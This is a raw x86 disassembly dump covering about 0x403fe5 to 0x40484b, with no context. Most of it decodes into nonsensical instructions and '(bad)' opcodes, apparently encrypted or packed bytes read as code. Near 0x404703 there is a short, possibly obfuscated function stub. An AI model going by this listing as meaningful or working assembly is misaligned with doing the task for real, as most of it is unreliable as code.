  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4245be,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4245c6,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4245c6,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0x591987ea
  4047be:	cdq    
  4047bf:	cmp    edi,DWORD PTR [esi+0x7e]
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [eax]
  4047d5:	add    eax,0xf3b0f08
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
  40484b:	fisttp QWORD PTR [esi+0x7f652044]
